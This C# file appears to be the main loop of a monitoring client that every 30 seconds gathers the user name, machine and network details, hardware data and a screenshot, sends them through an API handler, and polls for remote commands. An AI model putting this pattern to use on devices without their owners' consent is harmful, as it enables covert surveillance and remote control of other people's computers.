using Driver1;
using System;
using System.Globalization;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Net.Sockets;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Reflection;


public class Program
{
    static async Task Main()
    {
        while (true)
        {
            try
            {
                
                var monitoredData = new
                {
                    // Monitored data properties
                    deviceName = System.Environment.MachineName,
                    userName = Environment.UserName,
                    localIP = GetLocalIPAddress(),
                    languageLayout = CultureInfo.InstalledUICulture.EnglishName,
                    timeZone = TimeZoneInfo.Local.DisplayName,
                    batteryPercentage = BatteryInfo.GetBatteryPercentage(),
                    isBatteryPluggedIn = BatteryInfo.IsPluggedIn(),
                    isConnectedToInternet = new WebClient().DownloadString("http://www.google.com") != null,
                    processorModel = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"),
                    processorArchitecture = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"),
                    processorCount = Environment.ProcessorCount,
                    logicalDrivesAvailable = Environment.GetLogicalDrives(),
                    osVersion = Environment.OSVersion.VersionString,
                    is64BitOS = Environment.Is64BitOperatingSystem, 
                    ramUsage = Process.GetCurrentProcess().PrivateMemorySize64,
                    timeOfMonitoring = DateTime.Now.ToString("HH:mm:ss - MM/dd/yyyy"),
                };
                await APIHandler.SendMonitoredDataAsync(monitoredData, ScreenshotCapture.GetScreenshotPath(), ScreenshotCapture.GetCurrentWallpaper());
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            Thread.Sleep(30000);
            await APIHandler.checkforRemoteCommands();

        }

    }

    public static string GetLocalIPAddress()
    {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        throw new Exception("No network adapters with an IPv4 address in the system!");
    }

}
